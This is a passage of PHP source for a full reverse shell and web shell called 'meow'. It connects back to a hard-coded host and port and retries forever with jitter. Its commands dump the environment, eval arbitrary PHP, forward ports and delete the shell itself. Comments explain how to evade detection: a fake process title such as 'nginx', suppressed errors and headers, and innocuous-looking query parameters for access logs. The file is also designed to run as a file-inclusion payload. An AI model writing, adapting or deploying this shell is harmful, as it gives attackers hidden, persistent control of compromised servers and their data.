                meow_out($sock, "[-] bad port\n");
                return 'continue';
            }
            meow_forward($sock, $bind, $lport, $rhost, $rport);
            return 'continue';
        }

        case '!env': {
            foreach ($_SERVER as $k => $v) {
                if (is_scalar($v)) {
                    meow_out($sock, sprintf("S %-24s %s\n", $k, (string)$v));
                }
            }
            foreach ($_ENV as $k => $v) {
                if (is_scalar($v)) {
                    meow_out($sock, sprintf("E %-24s %s\n", $k, (string)$v));
                }
            }
            [$o, ] = meow_exec('env', 10);
            meow_out($sock, $o);
            return 'continue';
        }

        case '!php': {
            $code = trim(substr($line, strlen($parts[0]) + 1));
            if ($code === '') {
                meow_out($sock, "usage: !php <code>\n");
                return 'continue';
            }
            ob_start();
            try {
                eval($code . ';');
                $r = (string)ob_get_clean();
                if ($r !== '') { meow_out($sock, $r); }
            } catch (\Throwable $e) {
                $r = (string)ob_get_clean();
                if ($r !== '') { meow_out($sock, $r); }
                meow_out($sock, "[-] " . $e->getMessage() . "\n");
            }
            return 'continue';
        }

        case '!cleanup': {
            $dropSelf = in_array('--self', $args, true);
            $files = $forwards = 0;

            meow_out($sock, "[*] cleanup\n");

            foreach (meow_effects() as $e) {
                if ($e[0] === 'write') {
                    $files++;
                    $path = $e[1];
                    if (!@is_file($path)) {
                        meow_out($sock, sprintf("    file   %-40s already gone\n", $path));
                        continue;
                    }
                    // Safety rule: the only paths that reach this branch are
                    // ones !upload/!download recorded in the ledger when IT
                    // wrote them. Anything else is simply not in the list.
                    if (@unlink($path)) {
                        meow_out($sock, sprintf("    file   %-40s removed (%d bytes)\n", $path, $e[2]));
                    } else {
                        meow_out($sock, sprintf("    file   %-40s FAILED\n", $path));
                    }
                    continue;
                }

                if ($e[0] === 'fwd') {
                    $forwards++;
                    [, $pid, $bind, $lport, $rhost, $rport] = $e;
                    $alive = function_exists('posix_kill') && @posix_kill($pid, 0);
                    if (!$alive) {
                        meow_out($sock, sprintf("    fwd    pid %-10d %s:%d -> %s:%d  not running\n",
                                                $pid, $bind, $lport, $rhost, $rport));
                        continue;
                    }
                    if (function_exists('posix_kill')) {
                        @posix_kill($pid, SIGTERM);
                        usleep(150000);
                        if (@posix_kill($pid, 0)) {
                            @posix_kill($pid, SIGKILL);
                        }
                    }
                    meow_out($sock, sprintf("    fwd    pid %-10d %s:%d -> %s:%d  terminated\n",
                                            $pid, $bind, $lport, $rhost, $rport));
                }
            }

            if ($files === 0 && $forwards === 0) {
                meow_out($sock, "    nothing tracked\n");
            }

            global $meowCwd;
            $before = $meowCwd ?? null;
            if ($before !== null) {
                $meowCwd = null;
                meow_out($sock, "    cwd    reset to " . meow_cwd() . "\n");
            }

            meow_out($sock, sprintf("[*] reverted %d file(s), stopped %d forward(s)\n",
                                    $files, $forwards));

            if ($dropSelf) {
                meow_out($sock, "[*] this shell removes itself: " . __FILE__ . "\n");
                usleep(60000);
                if (is_resource($sock)) { @fclose($sock); }
                @unlink(__FILE__);
                exit(0);
            }
            meow_out($sock, "[i] !selfdestruct removes the shell itself\n");
            return 'continue';
        }

        case '!selfdestruct': {
            $self = __FILE__;
            meow_out($sock, "[*] removing " . $self . "\n");
            usleep(60000);                       // let the line flush
            if (is_resource($sock)) { @fclose($sock); }
            @unlink($self);
            exit(0);
        }
    }

    return 'continue';
}

/* ========================================================================== *
 *  SESSION LOOPS                                                             *
 * ========================================================================== */

/** Simple line-at-a-time session. Always available. */
function meow_session($sock): void
{
    global $meow, $meowCwd;

    if (is_resource($sock)) {
        @stream_set_blocking($sock, true);
        @stream_set_write_buffer($sock, 0);
    }

    meow_out($sock, meow_banner());
    if (!empty($meow['pty'])) {
        meow_out($sock, "[i] send !upgrade for an interactive PTY, !help for commands\n");
    }
    meow_out($sock, meow_prompt());

    while (is_resource($sock) && !@feof($sock)) {
        $line = @fgets($sock, 8192);
        if ($line === false) { break; }
        $line = rtrim((string)$line, "\r\n");
        if ($line === '') {
            meow_out($sock, meow_prompt());
            continue;
        }

        if ($line[0] === '!' && substr($line, 0, 2) !== '!!') {
            $act = meow_builtin($sock, $line);
            if ($act === 'exit')    { return; }
            if ($act === 'upgrade') { meow_pty_session($sock); }
            meow_out($sock, meow_prompt());
            continue;
        }
        if (substr($line, 0, 2) === '!!') {
            // Neutralise the pipeline-negation operator so '!' lands in the
            // shell as a literal command name (see meow_pty_session).
            $line = '\\' . substr($line, 1);
        }

        [$o, $c] = meow_exec($line);
        meow_out($sock, $o);
        if ($c !== 0) {
            meow_out($sock, sprintf("\n[exit %d]", $c));
        }
        meow_out($sock, meow_prompt());
    }
}

/* ========================================================================== *
 *  BLENDING IN                                                               *
 * ========================================================================== */

/**
 * Rename this process.
 *
 * cli_set_process_title() calls prctl(PR_SET_NAME), which the kernel truncates
 * to 15 characters. Pick something that already exists on the host -- 'nginx',
 * 'apache2', 'sshd' -- so a reader of `ps` sees a service they expect rather
 * than an interpreter running a .php5 file.
 *
 * Only works on the CLI SAPI. Under php-fpm there is one process per request
 * and no title to set, which is exactly why this is a callback-time feature.
 */
function meow_disguise(): void
{
    $alias = (string)$GLOBALS['meow']['proc_alias'];
    if ($alias === '' || !function_exists('cli_set_process_title')) {
        return;
    }
    @cli_set_process_title($alias);
}

/**
 * Randomise a callback delay by +/- $jitter.
 *
 * A fixed 30s interval is the single easiest beacon signature to write a rule
 * for. Adding +/-60% noise puts consecutive intervals at 12s-48s and defeats
 * a naive "constant interval" detector while keeping the same average rate.
 */
function meow_jitter(int $delay): int
{
    $j = (float)$GLOBALS['meow']['jitter'];
    if ($j <= 0.0) {
        return $delay;
    }
    $r = mt_rand(0, 1000) / 1000.0;          // 0..1
    $factor = 1.0 - ($r * 2.0 - 1.0) * $j;   // 1-j .. 1+j
    return max(1, (int)round($delay * $factor));
}

/* -------------------------------------------------------------------------- *
 *  Side-effect ledger -- what !cleanup will revert                           *
 * -------------------------------------------------------------------------- */

function meow_note(array $effect): void
{
    $GLOBALS['meow']['effects'][] = $effect;
}

function meow_effects(): array
{
    return isset($GLOBALS['meow']['effects']) ? $GLOBALS['meow']['effects'] : [];
}

/* ========================================================================== *
 *  TRANSPORT                                                                 *
 * ========================================================================== */

function meow_connect()
{
    $host = (string)$GLOBALS['meow']['host'];
    $port = (int)$GLOBALS['meow']['port'];

    $ctx = stream_context_create([
        'ssl' => [
            'verify_peer'       => false,
            'verify_peer_name'  => false,
            'allow_self_signed' => true,
            'peer_name'         => $host,
        ],
    ]);

    $fp = @stream_socket_client(
        "tcp://{$host}:{$port}",
        $errno,
        $errstr,
        15,
        STREAM_CLIENT_CONNECT,
        $ctx
    );
    if ($fp === false) {
        return false;
    }

    if (!empty($GLOBALS['meow']['tls'])) {
        $ok = @stream_socket_enable_crypto($fp, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
        if ($ok !== true) {
            @fclose($fp);
            return false;
        }
    }

    @stream_set_write_buffer($fp, 0);
    return $fp;
}

function meow_handshake($sock): void
{
    $token = (string)$GLOBALS['meow']['token'];
    if ($token !== '') {
        // hash, never the plaintext, crosses the wire
        @fwrite($sock, "MEOW-AUTH " . hash('sha256', $token) . "\n");
    }
}

function meow_reverse(): void
{
    @set_time_limit(0);
    @ignore_user_abort(true);

    meow_disguise();

    if ((string)$GLOBALS['meow']['token'] === '' && empty($GLOBALS['meow']['quiet'])) {
        @fwrite(STDERR,
            "meow: WARNING - no token set. Anything that can reach "
            . $GLOBALS['meow']['host'] . ':' . $GLOBALS['meow']['port']
            . " can drive this shell. Set MEOW_TOKEN=<value> or edit 'token' in this file.\n");
    }

    $tries = 0;
    while (true) {
        $sock = meow_connect();
        if (is_resource($sock)) {
            meow_handshake($sock);
            meow_session($sock);
            if (is_resource($sock)) { @fclose($sock); }
            $tries = 0;                            // we connected, reset backoff
        }

        if (empty($GLOBALS['meow']['retry'])) { break; }

        $tries++;
        if ((int)$GLOBALS['meow']['retry_max'] > 0 && $tries >= (int)$GLOBALS['meow']['retry_max']) {
            break;
        }

        // 5, 10, 20, 40 ... capped at 60, then jittered
        $delay = min(60, (int)$GLOBALS['meow']['retry_delay'] * (1 << min($tries, 4)));
        $delay = meow_jitter($delay);
        sleep($delay);
    }
}

/* ========================================================================== *
 *  WEB SHELL MODE                                                            *
 * ========================================================================== */

function meow_web(): void
{
    @ignore_user_abort(true);

    // A PHP warning dumping a path and a line number is a bigger giveaway
    // than the shell itself. Never show them, and drop the version header
    // that would name the interpreter to anyone reading response headers.
    @ini_set('display_errors', '0');
    @ini_set('log_errors', '0');
    if (function_exists('header_remove')) {
        @header_remove('X-Powered-By');
    }
    header_remove('X-Powered-By');

    header('Content-Type: text/plain; charset=utf-8');
    header('X-Content-Type-Options: nosniff');
    header('Cache-Control: no-store');

    $cfg = $GLOBALS['meow'];
    if (!meow_token_ok(isset($_GET[$cfg['web_key']]) ? (string)$_GET[$cfg['web_key']] : '',
                       (string)$cfg['token'])) {
        http_response_code(403);
        echo "403\n";
        return;
    }

    /* Prefer the base64 channel: commands often carry quotes and metacharacters
     * that a query string will mangle. */
    $cmd = null;
    foreach ([[$_POST[$cfg['web_b64']] ?? null, true],
              [$_GET[$cfg['web_b64']]  ?? null, true],
              [$_POST[$cfg['web_cmd']] ?? null, false],
              [$_GET[$cfg['web_cmd']]  ?? null, false]] as [$v, $b64]) {
        if (is_string($v) && trim($v) !== '') {
            $cmd = $b64 ? base64_decode($v) : $v;
            break;
        }
    }

    if ($cmd === null || trim((string)$cmd) === '') {
        echo "ok\n";
        return;
    }

    [$o, ] = meow_exec((string)$cmd, 60);
    echo meow_utf8($o);
}

/* ========================================================================== *
 *  ENTRY                                                                     *
 * ========================================================================== */

$GLOBALS['meow'] = meow_cfg([
    'host'        => '192.168.173.57',
    'port'        => 6665,
    'token'       => 'X82Wd3t0qasJ87D9hUqPXCl5',
    'tls'         => false,
    'retry'       => true,
    'retry_max'   => 0,             // 0 = forever
    'retry_delay' => 5,
    'exec_timeout'=> 30,            // wall-clock cap per command; 0 disables
    'pty'         => true,
    'quiet'       => false,
    'web'         => true,
    'web_key'     => 'k',
    'web_cmd'     => 'c',
    'web_b64'     => 'cb',
    'run_key'     => 'sid',          // include trigger key  (?sid=upd)
    'run_val'     => 'upd',
    'web_key'     => 'sid',           // request param carrying the token
    'web_b64'     => 'upd',           // request param carrying base64 command
    // Change 'sid'/'upd' above per engagement: an access log reading
    // "?sid=...&upd=..." is unremarkable; one reading "?k=...&cb=..." is not.
    'proc_alias'  => '',             // e.g. 'nginx'; '' leaves the process title
    'jitter'      => 0,              // 0..1, randomises each callback delay
    'version'     => '2.1',
]);

/* Safe by default: nothing happens just because we were included.
 * The opt-in trigger makes the file usable as a plain LFI payload too. */
$runOnInclude = false;
if (isset($_GET[$GLOBALS['meow']['run_key']])
    && (string)$_GET[$GLOBALS['meow']['run_key']] === (string)$GLOBALS['meow']['run_val']) {
    $runOnInclude = true;
}
if (getenv('MEOW_RUN_ON_INCLUDE')) {
    $runOnInclude = true;
}

if (meow_entry() || $runOnInclude) {
    if (meow_http()) {
        if (!empty($GLOBALS['meow']['web'])) {
            meow_web();
        }
    } else {
        meow_reverse();
    }
}
